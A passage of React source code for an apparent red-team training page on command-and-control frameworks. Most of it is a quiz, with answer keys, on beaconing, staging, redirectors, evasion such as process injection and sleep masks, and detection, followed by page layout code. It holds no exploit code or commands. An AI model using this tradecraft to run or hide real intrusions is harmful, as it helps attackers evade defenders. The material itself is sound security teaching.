      "The encryption algorithm used for traffic",
      "The number of operators allowed",
    ],
    correctAnswer: 0,
    explanation: "Sleep time sets how frequently the implant calls home.",
  },
  {
    id: 17,
    topic: "Beaconing",
    question: "What is a common tradeoff of long sleep intervals?",
    options: [
      "Lower detection risk but slower response",
      "Higher bandwidth usage",
      "No need for encryption",
      "Guaranteed persistence",
    ],
    correctAnswer: 0,
    explanation: "Longer sleeps reduce noise but make the agent less responsive to tasks.",
  },
  {
    id: 18,
    topic: "OPSEC",
    question: "What is a kill date in an implant?",
    options: [
      "A time when the agent self-terminates",
      "A timestamp when data exfiltration starts",
      "A method for deleting logs",
      "A DNS record used for staging",
    ],
    correctAnswer: 0,
    explanation: "Kill dates help limit exposure if an operation runs too long.",
  },
  {
    id: 19,
    topic: "Infrastructure",
    question: "What is a staging server?",
    options: [
      "A host that delivers additional stages separate from the team server",
      "A database for storing operator notes",
      "A server used only for vulnerability scanning",
      "A host used to decrypt stolen data",
    ],
    correctAnswer: 0,
    explanation: "Separating staging reduces exposure of the core team server.",
  },
  {
    id: 20,
    topic: "Core Concepts",
    question: "What does call-home C2 mean?",
    options: [
      "The target initiates the outbound connection to the server",
      "The server scans targets and connects inward",
      "Operators must be on-site to connect",
      "The C2 channel is limited to DNS only",
    ],
    correctAnswer: 0,
    explanation: "Call-home models use outbound connections to traverse firewalls.",
  },
  {
    id: 21,
    topic: "C2 Frameworks",
    question: "Cobalt Strike Aggressor Script is used for:",
    options: [
      "Automating tasks and extending framework behavior",
      "Encrypting all traffic with mTLS",
      "Performing kernel exploits automatically",
      "Replacing the Beacon payload at runtime",
    ],
    correctAnswer: 0,
    explanation: "Aggressor Script lets operators customize workflows and automation.",
  },
  {
    id: 22,
    topic: "C2 Frameworks",
    question: "Beacon Object Files (BOFs) enable:",
    options: [
      "Running small COFF modules in memory without new processes",
      "Building full GUI clients for operators",
      "Replacing system drivers on disk",
      "Sending data only over DNS",
    ],
    correctAnswer: 0,
    explanation: "BOFs allow modular capabilities executed in Beacon memory space.",
  },
  {
    id: 23,
    topic: "C2 Frameworks",
    question: "Sliver's Armory provides:",
    options: [
      "Community extensions and tools",
      "A built-in vulnerability scanner",
      "A managed hosting service for team servers",
      "A password vault for operators",
    ],
    correctAnswer: 0,
    explanation: "Armory is the ecosystem for Sliver plugins and extensions.",
  },
  {
    id: 24,
    topic: "C2 Frameworks",
    question: "In Mythic, a payload type is best described as:",
    options: [
      "An implementation of an agent or implant",
      "A UI theme for the web console",
      "A network redirector configuration",
      "A set of firewall rules for C2 traffic",
    ],
    correctAnswer: 0,
    explanation: "Payload types define how Mythic agents are built and behave.",
  },
  {
    id: 25,
    topic: "C2 Frameworks",
    question: "Covenant's default agent is called:",
    options: [
      "Grunt",
      "Beacon",
      "Demon",
      "Stager",
    ],
    correctAnswer: 0,
    explanation: "Covenant uses a .NET agent known as Grunt.",
  },
  {
    id: 26,
    topic: "C2 Frameworks",
    question: "PowerShell Empire is best known for using which language for agents?",
    options: [
      "PowerShell",
      "Rust",
      "Go",
      "Java",
    ],
    correctAnswer: 0,
    explanation: "Empire popularized PowerShell-based post-exploitation agents.",
  },
  {
    id: 27,
    topic: "C2 Frameworks",
    question: "Havoc's agent is named:",
    options: [
      "Demon",
      "Grunt",
      "Beacon",
      "Stager",
    ],
    correctAnswer: 0,
    explanation: "Havoc uses the Demon agent for operations.",
  },
  {
    id: 28,
    topic: "C2 Frameworks",
    question: "Sliver is primarily written in:",
    options: [
      "Go",
      "Python",
      "C#",
      "Ruby",
    ],
    correctAnswer: 0,
    explanation: "Sliver is a Go-based C2 framework with cross-platform agents.",
  },
  {
    id: 29,
    topic: "Payloads",
    question: "What is a stager?",
    options: [
      "A small loader that retrieves the full payload",
      "A report generated after staging completes",
      "A defensive tool that blocks malware",
      "A network sensor for detecting C2 traffic",
    ],
    correctAnswer: 0,
    explanation: "Stagers are lightweight loaders that fetch a larger agent.",
  },
  {
    id: 30,
    topic: "OPSEC",
    question: "What is a primary downside of using default C2 profiles?",
    options: [
      "They are easily signatured and detected",
      "They require kernel access to run",
      "They only work on macOS",
      "They cannot execute shell commands",
    ],
    correctAnswer: 0,
    explanation: "Default profiles often have well-known indicators used by defenders.",
  },
  {
    id: 31,
    topic: "Protocols",
    question: "Which protocol is typically most bandwidth constrained?",
    options: [
      "DNS",
      "HTTPS",
      "SMB",
      "TCP raw sockets",
    ],
    correctAnswer: 0,
    explanation: "DNS requests and responses are small and constrained.",
  },
  {
    id: 32,
    topic: "Beaconing",
    question: "A beaconing pattern refers to:",
    options: [
      "Regular, repeated check-ins to the C2 server",
      "One-time payload downloads",
      "Encrypted file storage on disk",
      "Authentication against a database",
    ],
    correctAnswer: 0,
    explanation: "Beaconing is periodic communication from implant to server.",
  },
  {
    id: 33,
    topic: "Protocols",
    question: "Why use HTTP POST instead of GET for C2 data?",
    options: [
      "POST can send larger data in the request body",
      "GET is always blocked by firewalls",
      "POST does not require a listener",
      "GET cannot be encrypted",
    ],
    correctAnswer: 0,
    explanation: "POST requests are better for sending larger payloads or results.",
  },
  {
    id: 34,
    topic: "Infrastructure",
    question: "A pivot listener is used to:",
    options: [
      "Route C2 traffic through a compromised host",
      "Rotate DNS zones for a domain",
      "Encrypt data at rest on the server",
      "Disable outbound network access",
    ],
    correctAnswer: 0,
    explanation: "Pivot listeners help extend C2 into segmented networks.",
  },
  {
    id: 35,
    topic: "Protocols",
    question: "What does protocol tunneling mean in C2?",
    options: [
      "Encapsulating C2 traffic inside another protocol",
      "Disabling encryption on the channel",
      "Sending traffic only over UDP",
      "Using only local named pipes",
    ],
    correctAnswer: 0,
    explanation: "Tunneling hides C2 traffic inside a different protocol like HTTP or DNS.",
  },
  {
    id: 36,
    topic: "Infrastructure",
    question: "What is a CDN redirector used for?",
    options: [
      "Hiding the origin server behind CDN infrastructure",
      "Replacing malware with security updates",
      "Automatically rotating encryption keys",
      "Blocking inbound connections",
    ],
    correctAnswer: 0,
    explanation: "CDNs can obscure the real C2 origin and blend with normal traffic.",
  },
  {
    id: 37,
    topic: "Infrastructure",
    question: "What is a DGA used for in C2 operations?",
    options: [
      "Generating many domains for rendezvous and resiliency",
      "Encrypting files with AES",
      "Compressing payloads for speed",
      "Blocking DNS queries from clients",
    ],
    correctAnswer: 0,
    explanation: "DGAs create numerous domains to evade blocks and takedowns.",
  },
  {
    id: 38,
    topic: "OPSEC",
    question: "Why avoid long-lived outbound TCP connections?",
    options: [
      "They are easier to detect and can time out",
      "They increase disk usage on the target",
      "They prevent use of HTTPS",
      "They require admin rights to open",
    ],
    correctAnswer: 0,
    explanation: "Persistent connections stand out and are often monitored.",
  },
  {
    id: 39,
    topic: "Resilience",
    question: "Fallback channels are used to:",
    options: [
      "Provide alternative communications if the primary channel is blocked",
      "Disable all encryption for performance",
      "Force agents to never sleep",
      "Replace team servers with peer-to-peer traffic",
    ],
    correctAnswer: 0,
    explanation: "Fallbacks keep access alive when a channel is disrupted.",
  },
  {
    id: 40,
    topic: "Infrastructure",
    question: "Why separate staging and C2 servers?",
    options: [
      "Reduce exposure of the core team server",
      "Increase the maximum payload size",
      "Prevent any use of TLS",
      "Make the implant run faster",
    ],
    correctAnswer: 0,
    explanation: "Splitting roles limits what is exposed if a staging server is found.",
  },
  {
    id: 41,
    topic: "OPSEC",
    question: "Sleep obfuscation helps by:",
    options: [
      "Masking or encrypting agent memory while idle",
      "Disabling network encryption",
      "Forcing the agent to run only as SYSTEM",
      "Automatically deleting logs",
    ],
    correctAnswer: 0,
    explanation: "Sleep obfuscation reduces memory-based detection during idle periods.",
  },
  {
    id: 42,
    topic: "OPSEC",
    question: "Why rotate C2 infrastructure regularly?",
    options: [
      "Limit exposure and reduce the impact of takedowns",
      "Increase beacon frequency for faster response",
      "Avoid the need for encryption",
      "Ensure all agents use the same domain",
    ],
    correctAnswer: 0,
    explanation: "Rotation reduces long-lived indicators and limits damage.",
  },
  {
    id: 43,
    topic: "Traffic Shaping",
    question: "Traffic shaping in C2 refers to:",
    options: [
      "Adjusting timing and size to mimic normal traffic patterns",
      "Blocking all outbound connections",
      "Encrypting payloads with RSA",
      "Using only peer-to-peer communication",
    ],
    correctAnswer: 0,
    explanation: "Shaping helps C2 traffic blend into normal network noise.",
  },
  {
    id: 44,
    topic: "Evasion",
    question: "Process injection is used to:",
    options: [
      "Run the agent inside a trusted process",
      "Disable antivirus updates permanently",
      "Rewrite system files on disk",
      "Improve network throughput",
    ],
    correctAnswer: 0,
    explanation: "Injection hides malicious code within legitimate processes.",
  },
  {
    id: 45,
    topic: "Evasion",
    question: "Parent process spoofing attempts to:",
    options: [
      "Make the process tree look legitimate",
      "Change file ownership on disk",
      "Encrypt the C2 channel",
      "Disable system auditing",
    ],
    correctAnswer: 0,
    explanation: "Spoofing the parent process can reduce suspicious process trees.",
  },
  {
    id: 46,
    topic: "Evasion",
    question: "Cobalt Strike's Artifact Kit is used to:",
    options: [
      "Customize payload artifacts to evade signatures",
      "Scan for open ports",
      "Generate phishing emails",
      "Create database backups",
    ],
    correctAnswer: 0,
    explanation: "Artifact Kit changes on-disk and in-memory artifacts for stealth.",
  },
  {
    id: 47,
    topic: "OPSEC",
    question: "Which is a common OPSEC mistake in C2 operations?",
    options: [
      "Reusing default certificates and URIs",
      "Using HTTPS with valid certificates",
      "Setting a kill date",
      "Using jitter on beacons",
    ],
    correctAnswer: 0,
    explanation: "Default indicators are well-known to defenders.",
  },
  {
    id: 48,
    topic: "Detection",
    question: "Which indicator is often associated with default Cobalt Strike?",
    options: [
      "Known URI patterns and JA3 fingerprints",
      "Randomized domain generation",
      "Zero network activity",
      "Only local named pipe traffic",
    ],
    correctAnswer: 0,
    explanation: "Default profiles have recognizable network fingerprints.",
  },
  {
    id: 49,
    topic: "Traffic Shaping",
    question: "Why customize the User-Agent header?",
    options: [
      "To blend with the target environment's normal traffic",
      "To disable TLS encryption",
      "To increase payload size",
      "To avoid using DNS",
    ],
    correctAnswer: 0,
    explanation: "Custom User-Agent strings reduce obvious fingerprints.",
  },
  {
    id: 50,
    topic: "Evasion",
    question: "Why is in-memory execution often preferred?",
    options: [
      "It reduces disk artifacts and AV detections",
      "It guarantees persistence across reboots",
      "It removes the need for encryption",
      "It is required for HTTPS C2",
    ],
    correctAnswer: 0,
    explanation: "Memory-only techniques leave fewer forensic traces on disk.",
  },
  {
    id: 51,
    topic: "Detection",
    question: "A common way defenders detect C2 is by spotting:",
    options: [
      "Periodic beaconing and repetitive URIs",
      "User logins during business hours",
      "Large software updates from vendors",
      "Regular backup traffic to NAS devices",
    ],
    correctAnswer: 0,
    explanation: "Repeated, timed callbacks are a typical detection signal.",
  },
  {
    id: 52,
    topic: "Detection",
    question: "JA3 fingerprints are used to:",
    options: [
      "Identify TLS client patterns in network traffic",
      "Detect fileless malware on disk",
      "Create DNS records for C2",
      "Encrypt data at rest",
    ],
    correctAnswer: 0,
    explanation: "JA3 hashes characterize TLS client handshakes.",
  },
  {
    id: 53,
    topic: "Detection",
    question: "A common sign of DNS tunneling is:",
    options: [
      "Long, high-entropy subdomains and unusual query volumes",
      "Only HTTP POST traffic",
      "Local loopback connections",
      "Short, human-readable hostnames",
    ],
    correctAnswer: 0,
    explanation: "Encoded data often shows up as long, random-looking subdomains.",
  },
  {
    id: 54,
    topic: "Detection",
    question: "Sinkholing a C2 domain means:",
    options: [
      "Redirecting traffic to a controlled server for analysis",
      "Deleting the domain from DNS entirely",
      "Blocking all internet access",
      "Replacing TLS with HTTP",
    ],
    correctAnswer: 0,
    explanation: "Sinkholes help observe infected systems and block real C2.",
  },
  {
    id: 55,
    topic: "Detection",
    question: "Which log source is most useful for DNS C2 detection?",
    options: [
      "DNS query logs",
      "Local application crash dumps",
      "Keyboard input logs",
      "USB device history",
    ],
    correctAnswer: 0,
    explanation: "DNS logs reveal query patterns and suspicious domains.",
  },
  {
    id: 56,
    topic: "Infrastructure",
    question: "C2 over cloud storage most closely resembles:",
    options: [
      "A dead drop using legitimate services",
      "A kernel driver update",
      "A local SMB named pipe",
      "An air-gapped transfer",
    ],
    correctAnswer: 0,
    explanation: "Cloud storage can be used to pass tasks and results indirectly.",
  },
  {
    id: 57,
    topic: "MITRE ATT&CK",
    question: "Which MITRE tactic covers Command and Control?",
    options: [
      "TA0011 Command and Control",
      "TA0003 Persistence",
      "TA0007 Discovery",
      "TA0010 Exfiltration",
    ],
    correctAnswer: 0,
    explanation: "TA0011 is the MITRE ATT&CK tactic for C2.",
  },
  {
    id: 58,
    topic: "MITRE ATT&CK",
    question: "Which MITRE technique covers proxy use?",
    options: [
      "T1090 Proxy",
      "T1071 Application Layer Protocol",
      "T1055 Process Injection",
      "T1041 Exfiltration Over C2 Channel",
    ],
    correctAnswer: 0,
    explanation: "T1090 describes proxying and multi-hop communications.",
  },
  {
    id: 59,
    topic: "MITRE ATT&CK",
    question: "Exfiltration over a C2 channel maps to which technique?",
    options: [
      "T1041 Exfiltration Over C2 Channel",
      "T1104 Multi-Stage Channels",
      "T1219 Remote Access Software",
      "T1567 Exfiltration Over Web Service",
    ],
    correctAnswer: 0,
    explanation: "T1041 describes data exfiltration using the C2 channel.",
  },
  {
    id: 60,
    topic: "Beaconing",
    question: "What does beacon jitter configuration do?",
    options: [
      "Randomizes sleep intervals by a percentage",
      "Forces beacons to run every second",
      "Disables network encryption",
      "Locks agents to a single IP",
    ],
    correctAnswer: 0,
    explanation: "Jitter varies timing to avoid fixed, easily detected intervals.",
  },
  {
    id: 61,
    topic: "OPSEC",
    question: "Why use unique hostnames or domains per target?",
    options: [
      "To reduce correlation and blocklist impact",
      "To increase payload size",
      "To disable DNS caching",
      "To prevent TLS from working",
    ],
    correctAnswer: 0,
    explanation: "Unique infrastructure limits cross-target detection and blocking.",
  },
  {
    id: 62,
    topic: "Operations",
    question: "Which component enables multi-operator collaboration?",
    options: [
      "Team server",
      "Beacon sleep mask",
      "Stager",
      "Redirector",
    ],
    correctAnswer: 0,
    explanation: "Team servers coordinate shared sessions and permissions.",
  },
  {
    id: 63,
    topic: "OPSEC",
    question: "The OPSEC vs functionality tradeoff means:",
    options: [
      "More evasion can reduce reliability or visibility",
      "Better OPSEC always increases bandwidth",
      "Functionality eliminates the need for OPSEC",
      "OPSEC only applies to payload encryption",
    ],
    correctAnswer: 0,
    explanation: "Evasive techniques can add complexity or reduce stability.",
  },
  {
    id: 64,
    topic: "Operations",
    question: "Why enforce role-based access on a team server?",
    options: [
      "Limit mistakes and improve auditing",
      "Increase beacon frequency automatically",
      "Allow any user to disable logging",
      "Shorten TLS certificates",
    ],
    correctAnswer: 0,
    explanation: "RBAC reduces accidental actions and helps accountability.",
  },
  {
    id: 65,
    topic: "OPSEC",
    question: "A sleep mask is used to:",
    options: [
      "Hide or encrypt agent memory while idle",
      "Force all traffic over DNS",
      "Disable user authentication",
      "Increase disk persistence",
    ],
    correctAnswer: 0,
    explanation: "Sleep masks reduce memory-based detection during idle periods.",
  },
  {
    id: 66,
    topic: "OPSEC",
    question: "Why use domains with realistic history and WHOIS data?",
    options: [
      "To avoid suspicion and reputation-based blocks",
      "To improve file transfer speed",
      "To bypass TLS encryption",
      "To disable proxy logging",
    ],
    correctAnswer: 0,
    explanation: "Well-aged domains are less likely to be flagged as suspicious.",
  },
  {
    id: 67,
    topic: "Protocols",
    question: "Lateral C2 inside a Windows network typically uses:",
    options: [
      "Internal protocols like SMB or named pipes",
      "Public CDNs only",
      "Bluetooth connections",
      "Satellite links",
    ],
    correctAnswer: 0,
    explanation: "Internal C2 often leverages SMB or named pipes for local reach.",
  },
  {
    id: 68,
    topic: "Payloads",
    question: "When are stageless payloads preferred?",
    options: [
      "When staging is blocked or too risky",
      "When bandwidth is unlimited",
      "When the target lacks a filesystem",
      "When DNS C2 is required",
    ],
    correctAnswer: 0,
    explanation: "Stageless payloads avoid fetching a second stage over the network.",
  },
  {
    id: 69,
    topic: "OPSEC",
    question: "Why avoid noisy enumeration commands on every host?",
    options: [
      "They trigger alerts and generate large logs",
      "They reduce network throughput",
      "They disable encryption",
      "They prevent persistence",
    ],
    correctAnswer: 0,
    explanation: "Noisy commands create suspicious artifacts and alerts.",
  },
  {
    id: 70,
    topic: "Core Concepts",
    question: "A listener is most similar to:",
    options: [
      "A server endpoint receiving agent callbacks",
      "A local keylogger",
      "A password hash database",
      "A backup archive",
    ],
    correctAnswer: 0,
    explanation: "Listeners handle inbound communications from implants.",
  },
  {
    id: 71,
    topic: "Detection",
    question: "Which is a sign of DNS tunneling?",
    options: [
      "Long, high-entropy subdomains",
      "Only HTTP GET requests",
      "No outbound DNS traffic",
      "Short, human-readable hostnames",
    ],
    correctAnswer: 0,
    explanation: "Encoded data often appears as long, random-looking subdomains.",
  },
  {
    id: 72,
    topic: "Traffic Shaping",
    question: "Malleable profiles can change:",
    options: [
      "Headers, URIs, and timing behaviors",
      "The Windows kernel version",
      "The target's local admin passwords",
      "Only the operator username",
    ],
    correctAnswer: 0,
    explanation: "Profiles shape how HTTP requests and responses appear on the wire.",
  },
  {
    id: 73,
    topic: "Detection",
    question: "Why are default C2 user agents risky?",
    options: [
      "They are known indicators used by defenders",
      "They prevent TLS from working",
      "They disable DNS resolution",
      "They always cause crashes",
    ],
    correctAnswer: 0,
    explanation: "Default user agents are common signatures for detection.",
  },
  {
    id: 74,
    topic: "Protocols",
    question: "Staging over SMB helps when:",
    options: [
      "Internet egress is blocked but internal SMB is available",
      "Only DNS is allowed",
      "The target is a mobile device",
      "The operator has no credentials",
    ],
    correctAnswer: 0,
    explanation: "SMB staging is useful inside segmented networks without internet access.",
  },
  {
    id: 75,
    topic: "Detection",
    question: "Which configuration increases detection risk?",
    options: [
      "Consistent beacon intervals with no jitter",
      "Randomized intervals and varied URIs",
      "Short-lived infrastructure",
      "Valid TLS certificates",
    ],
    correctAnswer: 0,
    explanation: "Fixed intervals make beaconing patterns easy to spot.",
  },
];

// Code block component
const CodeBlock = ({ children, language }: { children: string; language?: string }) => {
  const theme = useTheme();
  return (
    <Paper
      sx={{
        p: 2,
        bgcolor: theme.palette.mode === "dark" ? "#1a1a2e" : "#f5f5f5",
        borderRadius: 1,
        fontFamily: "monospace",
        fontSize: "0.85rem",
        overflow: "auto",
        whiteSpace: "pre-wrap",
        wordBreak: "break-word",
      }}
    >
      <code style={{ color: theme.palette.mode === "dark" ? "#22d3ee" : "#0d47a1" }}>{children}</code>
    </Paper>
  );
};

export default function C2FrameworksGuidePage() {
  const theme = useTheme();
  const navigate = useNavigate();

  // Navigation state
  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
  const [activeSection, setActiveSection] = useState("overview");
  const isMobile = useMediaQuery(theme.breakpoints.down("md"));

  const accent = "#dc2626"; // Red accent color for C2 theme

  // Section navigation items with frameworks as sub-items
  const sectionNavItems = [
    { id: "overview", label: "Overview", icon: <SettingsRemoteIcon /> },
    { id: "frameworks", label: "Frameworks", icon: <BuildIcon /> },
    { id: "fw-cobalt-strike", label: "Cobalt Strike", icon: <SettingsRemoteIcon />, indent: true },
    { id: "fw-sliver", label: "Sliver", icon: <SettingsRemoteIcon />, indent: true },
    { id: "fw-havoc", label: "Havoc", icon: <SettingsRemoteIcon />, indent: true },
    { id: "fw-mythic", label: "Mythic", icon: <SettingsRemoteIcon />, indent: true },
    { id: "fw-covenant", label: "Covenant", icon: <SettingsRemoteIcon />, indent: true },
    { id: "fw-brute-ratel", label: "Brute Ratel C4", icon: <SettingsRemoteIcon />, indent: true },
    { id: "fw-metasploit", label: "Metasploit", icon: <SettingsRemoteIcon />, indent: true },
    { id: "fw-empire", label: "Empire/Starkiller", icon: <SettingsRemoteIcon />, indent: true },
    { id: "fw-poshc2", label: "PoshC2", icon: <SettingsRemoteIcon />, indent: true },
    { id: "protocols", label: "Protocols", icon: <NetworkCheckIcon /> },
    { id: "infrastructure", label: "Infrastructure", icon: <CloudIcon /> },
    { id: "opsec", label: "OPSEC", icon: <VisibilityOffIcon /> },
    { id: "detection", label: "Detection", icon: <ShieldIcon /> },
    { id: "resources", label: "Resources", icon: <SchoolIcon /> },
    { id: "quiz-section", label: "Knowledge Check", icon: <QuizIcon /> },
  ];

  // Scroll to section
  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" });
      setActiveSection(sectionId);
      setNavDrawerOpen(false);
    }
  };

  // Track active section on scroll
  useEffect(() => {
    const handleScroll = () => {
      const sections = sectionNavItems.map(item => document.getElementById(item.id));
      const scrollPosition = window.scrollY + 150;
      
      for (let i = sections.length - 1; i >= 0; i--) {
        const section = sections[i];
        if (section && section.offsetTop <= scrollPosition) {
          setActiveSection(sectionNavItems[i].id);
          break;
        }
      }
    };
    
    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  // Scroll to top
  const scrollToTop = () => window.scrollTo({ top: 0, behavior: "smooth" });

  // Progress calculation based on scroll
  const [progressPercent, setProgressPercent] = useState(0);
  useEffect(() => {
    const handleProgress = () => {
      const totalHeight = document.documentElement.scrollHeight - window.innerHeight;
      const progress = totalHeight > 0 ? (window.scrollY / totalHeight) * 100 : 0;
      setProgressPercent(progress);
    };
    window.addEventListener("scroll", handleProgress);
    return () => window.removeEventListener("scroll", handleProgress);
  }, []);

  const pageContext = `This page covers command and control (C2) frameworks for adversary simulation and red team operations. Topics include popular C2 platforms, payload generation, communication channels, evasion techniques, OPSEC considerations, detection methods, and defensive strategies.`;

  // Sidebar navigation component
  const sidebarNav = (
    <Paper
      elevation={0}
      sx={{
        width: 220,
        flexShrink: 0,
        position: "sticky",
        top: 80,
        maxHeight: "calc(100vh - 100px)",
        overflowY: "auto",
        borderRadius: 3,
        border: `1px solid ${alpha(accent, 0.15)}`,
        bgcolor: alpha(theme.palette.background.paper, 0.6),
        display: { xs: "none", lg: "block" },
        "&::-webkit-scrollbar": {
          width: 6,
        },
        "&::-webkit-scrollbar-thumb": {
          bgcolor: alpha(accent, 0.3),
          borderRadius: 3,
        },
      }}
    >
      <Box sx={{ p: 2 }}>
        <Typography
          variant="subtitle2"
          sx={{ fontWeight: 700, mb: 1, color: accent, display: "flex", alignItems: "center", gap: 1 }}
        >
          <ListAltIcon sx={{ fontSize: 18 }} />
          Course Navigation
        </Typography>
        <Box sx={{ mb: 2 }}>
          <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
            <Typography variant="caption" color="text.secondary">
              Progress
            </Typography>
            <Typography variant="caption" sx={{ fontWeight: 600, color: accent }}>
              {Math.round(progressPercent)}%
            </Typography>
          </Box>
          <LinearProgress
            variant="determinate"
            value={progressPercent}
            sx={{
              height: 6,
              borderRadius: 3,
              bgcolor: alpha(accent, 0.1),
              "& .MuiLinearProgress-bar": {
                bgcolor: accent,
                borderRadius: 3,
              },
            }}
          />
        </Box>
        <Divider sx={{ mb: 1 }} />
        <List dense sx={{ mx: -1 }}>
          {sectionNavItems.map((item) => (
            <ListItem
              key={item.id}
              onClick={() => scrollToSection(item.id)}
              sx={{
                borderRadius: 1.5,
                mb: 0.25,
                py: item.indent ? 0.25 : 0.5,
                pl: item.indent ? 3 : 1,
                cursor: "pointer",
                bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent",
                borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent",
                "&:hover": {
                  bgcolor: alpha(accent, 0.08),
                },
                transition: "all 0.15s ease",
              }}
            >
              <ListItemIcon sx={{ minWidth: item.indent ? 20 : 24, fontSize: item.indent ? "0.75rem" : "0.9rem" }}>{item.icon}</ListItemIcon>
              <ListItemText
                primary={
                  <Typography
                    variant="caption"
                    sx={{
                      fontWeight: activeSection === item.id ? 700 : 500,
                      color: activeSection === item.id ? accent : "text.secondary",
                      fontSize: item.indent ? "0.7rem" : "0.75rem",
                    }}
                  >
                    {item.label}
                  </Typography>
                }
              />
            </ListItem>
          ))}
        </List>
      </Box>
    </Paper>
  );

  return (
    <LearnPageLayout pageTitle="C2 Frameworks Guide" pageContext={pageContext}>
      <Box sx={{ display: "flex", gap: 3, position: "relative" }}>
        {/* Sidebar Navigation */}
        {sidebarNav}

        {/* Main Content */}
        <Container maxWidth="lg" sx={{ py: 4, flex: 1 }}>
          {/* Back Button */}
          <Chip
            component={Link}
            to="/learn"
            icon={<ArrowBackIcon />}
            label="Back to Learning Hub"
            clickable
            variant="outlined"
            sx={{ borderRadius: 2, mb: 3 }}
          />

      {/* Hero Banner */}
      <Paper
        sx={{
          p: 4,
          mb: 4,
          borderRadius: 4,
          background: `linear-gradient(135deg, ${alpha(accent, 0.15)} 0%, ${alpha("#f59e0b", 0.1)} 100%)`,
          border: `1px solid ${alpha(accent, 0.2)}`,
          position: "relative",
          overflow: "hidden",
        }}
      >
        <Box
          sx={{
            position: "absolute",
            top: -50,
            right: -50,
            width: 200,
            height: 200,
            borderRadius: "50%",
            background: `linear-gradient(135deg, ${alpha(accent, 0.1)}, transparent)`,
          }}
        />
        <Box sx={{ display: "flex", alignItems: "center", gap: 3, position: "relative" }}>
          <Box
            sx={{
              width: 80,
              height: 80,
              borderRadius: 3,
              background: `linear-gradient(135deg, ${accent}, #f59e0b)`,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              boxShadow: `0 8px 32px ${alpha(accent, 0.3)}`,
            }}
          >
            <SettingsRemoteIcon sx={{ fontSize: 45, color: "white" }} />
          </Box>
          <Box>
            <Chip label="Red Team" size="small" sx={{ mb: 1, fontWeight: 600, bgcolor: alpha(accent, 0.1), color: accent }} />
            <Typography variant="h3" sx={{ fontWeight: 800, mb: 1 }}>
              Command & Control (C2) Frameworks
            </Typography>
            <Typography variant="h6" color="text.secondary" sx={{ maxWidth: 600 }}>
              Understanding adversary communication infrastructure for red team operations
            </Typography>
          </Box>
        </Box>
      </Paper>

      {/* Tags */}
      <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap", mb: 4 }}>
        <Chip label="Post-Exploitation" size="small" sx={{ bgcolor: alpha("#f59e0b", 0.1), color: "#f59e0b" }} />
        <Chip label="Adversary Simulation" size="small" sx={{ bgcolor: alpha("#8b5cf6", 0.1), color: "#8b5cf6" }} />
        <Chip label="Advanced" size="small" variant="outlined" />
      </Box>

      {/* Section: Overview */}
      <Box id="overview" sx={{ display: "flex", flexDirection: "column", gap: 3, scrollMarginTop: 80 }}>
        <Typography variant="h4" sx={{ fontWeight: 800, mb: 1, display: "flex", alignItems: "center", gap: 2 }}>
          <SettingsRemoteIcon sx={{ color: accent }} />
          Overview
        </Typography>
        <Alert severity="warning" sx={{ borderRadius: 2 }}>
          <AlertTitle>For Authorized Testing Only</AlertTitle>
          C2 frameworks are powerful tools for authorized red team and penetration testing engagements only.
          Unauthorized use against systems you don't own or have explicit permission to test is illegal and unethical.
        </Alert>

          {/* Simple Introduction */}
          <Paper sx={{ p: 4, borderRadius: 2, bgcolor: alpha(theme.palette.primary.main, 0.02) }}>
            <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 3 }}>
              <LightbulbIcon sx={{ fontSize: 32, color: "#f59e0b" }} />
              <Typography variant="h5" sx={{ fontWeight: 800 }}>
                What is C2? (Explained Simply)
              </Typography>
            </Box>
            
            <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
              Imagine you're a security professional hired to test a company's defenses. You've managed to get initial access 
              to one of their computers (with permission, of course). Now what? You need a way to:
            </Typography>

            <Grid container spacing={2} sx={{ mb: 3 }}>
              <Grid item xs={12} md={6}>
                <Box sx={{ display: "flex", gap: 2, alignItems: "flex-start" }}>
                  <Box sx={{ p: 1, borderRadius: 1, bgcolor: alpha("#3b82f6", 0.1), minWidth: 40, textAlign: "center" }}>
                    <Typography variant="h6" sx={{ fontWeight: 800, color: "#3b82f6" }}>1</Typography>
                  </Box>
                  <Box>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Maintain Access</Typography>
                    <Typography variant="body2" color="text.secondary">
                      Keep your connection alive even if the user reboots or logs out
                    </Typography>
                  </Box>
                </Box>
              </Grid>
              <Grid item xs={12} md={6}>
                <Box sx={{ display: "flex", gap: 2, alignItems: "flex-start" }}>
                  <Box sx={{ p: 1, borderRadius: 1, bgcolor: alpha("#10b981", 0.1), minWidth: 40, textAlign: "center" }}>
                    <Typography variant="h6" sx={{ fontWeight: 800, color: "#10b981" }}>2</Typography>
                  </Box>
                  <Box>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Execute Commands</Typography>
                    <Typography variant="body2" color="text.secondary">
                      Run programs, explore files, and gather information remotely
                    </Typography>
                  </Box>
                </Box>
              </Grid>
              <Grid item xs={12} md={6}>
                <Box sx={{ display: "flex", gap: 2, alignItems: "flex-start" }}>
                  <Box sx={{ p: 1, borderRadius: 1, bgcolor: alpha("#f59e0b", 0.1), minWidth: 40, textAlign: "center" }}>
                    <Typography variant="h6" sx={{ fontWeight: 800, color: "#f59e0b" }}>3</Typography>
                  </Box>
                  <Box>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Stay Hidden</Typography>
                    <Typography variant="body2" color="text.secondary">
                      Avoid detection by security tools while you assess the environment
                    </Typography>
                  </Box>
                </Box>
              </Grid>
              <Grid item xs={12} md={6}>
                <Box sx={{ display: "flex", gap: 2, alignItems: "flex-start" }}>
                  <Box sx={{ p: 1, borderRadius: 1, bgcolor: alpha("#8b5cf6", 0.1), minWidth: 40, textAlign: "center" }}>
                    <Typography variant="h6" sx={{ fontWeight: 800, color: "#8b5cf6" }}>4</Typography>
                  </Box>
                  <Box>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Move Around</Typography>
                    <Typography variant="body2" color="text.secondary">
                      Reach other systems on the internal network (pivoting)
                    </Typography>
